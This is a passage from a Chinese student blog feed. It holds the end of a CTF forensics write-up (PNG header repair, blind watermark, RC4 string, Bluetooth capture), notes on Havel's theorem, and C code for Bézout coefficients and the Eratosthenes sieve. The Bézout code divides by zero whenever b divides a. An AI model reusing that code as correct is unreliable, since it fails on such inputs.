alt="570f9044-57e8-4a09-b2e7-3c102d8bfd99"></p><p>我们就要在前面追加上89 50 4E 47，但是直接写是覆盖，顺便一提。00 00 00 0D是数据块长度， 后面一个是数据块标识，再就是宽高</p><p>所以我们记事本打开，在前面加4个数字（字母），然后再在010里该文件头。就能成功的打开</p><p>然后直接寄出我们的盲水印工具</p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/aee2b9c6-bacc-4836-a801-a3c38fe39769.png" alt="aee2b9c6-bacc-4836-a801-a3c38fe39769"></p><p>解出来这样一个鬼鬼<code>6w6KP/K02Ntu/PCQfdm85LL3ClWzG741P90izBXt</code></p><p><img src="file:///C:/Users/WangTao/Pictures/Typedown/bd90d59a-f6db-4132-b96f-6d33277c9e20.png" alt="bd90d59a-f6db-4132-b96f-6d33277c9e20"></p><p>虽然搞不懂是啥子东东，但是可以反向研究——经反向研究发现是RC4加密（这里挖个坑，到时候补上）找个解密工具</p><p>top：有时候解出乱码，就把零0和大噢O换一下，大写哎i和小写爱奥l换一下</p><h1 id="wireshark蓝牙分析"><a href="#wireshark蓝牙分析" class="headerlink" title="wireshark蓝牙分析"></a>wireshark蓝牙分析</h1><p>蓝牙抓包分析第一次见，实操。属实不会，但是这篇文章给了灵感<a href="https://cloud.tencent.com/developer/article/2159878">两道蓝牙相关的CTF题目-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>慢慢看，找value值。</p><p>![1WXBM2Z[@%25VOB]<a href="file:///C:/Users/WangTao/Documents/Tencent%20Files/2412433597/Image/Group2/1W/XB/1WXBM2Z[@%25VOB][B~%60QUA8I.jpg">B~%60QUA8I</a></p><p>找到这些，而且244流之后value框颜色变了，所谓事出反常必有妖。</p><p>今日太晚，明日再战</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>可图化的判断</title>
      <link href="/2023/10/06/%E5%8F%AF%E5%9B%BE%E5%8C%96%E5%88%A4%E6%96%AD/"/>
      <url>/2023/10/06/%E5%8F%AF%E5%9B%BE%E5%8C%96%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="可简单图化"><a href="#可简单图化" class="headerlink" title="可简单图化"></a>可简单图化</h1><p>图论中给出一串整数列判断其是否可图化以及是否可简图化是一个十分重要的问题，而对于这两个问题前人提出了<strong>可图化定理</strong>及<strong>Havel定理</strong></p><h2 id="可图画定理"><a href="#可图画定理" class="headerlink" title="可图画定理"></a>可图画定理</h2><p>此定理由握手定理引出，内容：</p><p>非负整数列$d&#x3D;(d_1,d_2…d_n)$是可图画的当且仅当$d_1+d_2+…+d_n&#x3D;0(mod2)$</p><h2 id="Havel定理"><a href="#Havel定理" class="headerlink" title="Havel定理"></a>Havel定理</h2><p>非负整数列$d&#x3D;(d_1,d_2…d_n)$满足</p><p>$d_1+d_2+…+d_n&#x3D;0(mod2)$</p><p>$n-1\geq d_1 \geq d_2\geq…\geq d_n\geq0$（因为简单图点的度要不能大于等于n）</p><p>则 d 可简单图化当且仅当d&#96;可简单图化</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>首先这个是用递归定义的我们当然用递归实现。整数列用数组装，传的时候用数组传。用这个递归方式传递。</p><p>出口就是判断极其简单的情况</p><p>易得，如果一个东东是可以简单图化的。那么递归到最后一定是只有一个0，或者我们搞得更快一点判断什么时候全是0的时候就ok</p><h2 id="整体思路和框架"><a href="#整体思路和框架" class="headerlink" title="整体思路和框架"></a>整体思路和框架</h2><p>首先我们要接收整数列，并得到他的长度并将其放在数组里</p><p>排序，判断是否可简单图化（是否可图化），（这里有一个隐含的判断第一个是否满足条件）传递给下一个（这个过程要）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>贝祖定理实现</title>
      <link href="/2023/10/06/%E8%B4%9D%E7%A5%96%E5%AE%9A%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/10/06/%E8%B4%9D%E7%A5%96%E5%AE%9A%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="贝祖定理"><a href="#贝祖定理" class="headerlink" title="贝祖定理"></a>贝祖定理</h1><p>贝祖定理是一个关于最大公约数的定理</p><p>内容：</p><p>$\forall a,b \in N_+,\exists s,t \in N ,使得 as+bt&#x3D;(a,b)$</p><p>那么我们要如何得到相应的s和t呢？</p><h2 id="计算s和t"><a href="#计算s和t" class="headerlink" title="计算s和t"></a>计算s和t</h2><p>贝祖定理的证明用到了广义欧几里得除法，而对于s和t的运算用到了广义欧几里得除法的逆用。</p><p>寄出高级图</p><p>所以我们可以使用动态规划实现找寻s和t</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Bezout</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line"></span><br><span class="line">Bezout(a,b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Bezout</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="type">int</span> s1=<span class="number">1</span>, s2=<span class="number">0</span>, t1=<span class="number">0</span>, t2=<span class="number">1</span>, q=<span class="number">0</span>, r1=a, r2=b, r3=<span class="number">1</span>, temps=<span class="number">0</span>, tempt=<span class="number">0</span>, tempq=<span class="number">0</span>, tempr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">q = r1/r2;</span><br><span class="line">r3=r1%r2;</span><br><span class="line"></span><br><span class="line">temps = <span class="number">-1</span>*q*s2+s1;</span><br><span class="line">tempt = <span class="number">-1</span>*q*t2+t1;</span><br><span class="line">tempq = r2/r3;</span><br><span class="line">tempr = r2%r3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(tempr == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s是：%d\nt是：%d&quot;</span>,temps,tempt);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s1 = s2; s2 = temps;</span><br><span class="line">t1 = t2; t2 = tempt;</span><br><span class="line">q = tempq;</span><br><span class="line">r1 = r2; r2 = r3; r3 = tempr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>代码实现厄氏筛法的过程</title>
      <link href="/2023/10/06/%E5%8E%84%E6%B0%8F%E7%AD%9B%E6%B3%95/"/>
      <url>/2023/10/06/%E5%8E%84%E6%B0%8F%E7%AD%9B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="厄氏筛法"><a href="#厄氏筛法" class="headerlink" title="厄氏筛法"></a>厄氏筛法</h1><p>自己的话总结下就是一个合数n一定有一个小于等于$\sqrt{n}$的因子。所以把小于$\sqrt{n}$的素数的2倍以上数全删掉就得到所有的小于等于n的素数了</p><h1 id="代码实现的想法"><a href="#代码实现的想法" class="headerlink" title="代码实现的想法"></a>代码实现的想法</h1><p>要实现这个东东，他怎么直到小于等于$\sqrt{n}$的素数有哪些，所以使用递归让$\sqrt{n}$不断减小，小岛一定程度我们就易知有哪些素数了（易知2、3、5、7是素数）</p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>许久未接触c了，递归也忘得差不多了。所以成这个时间再looklook</p><p>简而言之，递归就是<strong>函数自己调用自己</strong></p><p>首先发现问题中重复的部分，分析参数，最后设计递归出口</p><h2 id="回头看厄氏筛法"><a href="#回头看厄氏筛法" class="headerlink" title="回头看厄氏筛法"></a>回头看厄氏筛法</h2><p>我们输入一个数n，要得到小于等于n的素数，</p><p>得到$\sqrt{n}$，要找小于等于$\sqrt{n}$的素数，将这些素数的倍数抹去</p><p>而难点就是如何直到小于等于$\sqrt{n}$的素数</p><p>就要将$\sqrt{n}$当作n重复上面的操作</p><p>那么最后不断地求根会得到2或者3，是2就返回2，是3就返回2，3</p><p>继续得到素数之后我们只要求倍数并且抹掉他们呢就行了</p><p>那么我们就可以创建一个数组，通过下标寻址，有两个状态：Y，N</p><p>创建一个动态的数组，用malloc函数给他分配空间</p><h2 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h2><p>命运的齿轮发生了转动。发现这个递归一点也不好写：）</p><p>寄出gpt</p><p>nn的，gpt人工智障了，但是他给出了这个算法不应该用递归实现，通常用迭代循环实现</p><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sieveOfEratosthenes</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="comment">//首先定义了一个素数表，并且初始化 </span></span><br><span class="line">    <span class="type">bool</span> isPrime[n+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        isPrime[i] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//巧妙的点，不使用求根而是反向判断这个数平方是否小于等于n </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">2</span>; p * p &lt;= n; p++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isPrime[p] == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = p * p; i &lt;= n; i += p) &#123;</span><br><span class="line">                isPrime[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;素数：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isPrime[i]) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个正整数n：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;在区间 [2, %d] 内的素数有：\n&quot;</span>, n);</span><br><span class="line">    sieveOfEratosthenes(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为有一个重要的点——从2开始，如果我们把最小的数的倍数都抹掉的话从下往上最小的哪一个一定是素数</p><p>由此这个迭代循环从下往上会更简单，我们只要从2开始将他的倍数抹去。直到大于n。而后换另一个。</p>]]></content>
      
      
      
    </entry>
    
    
    
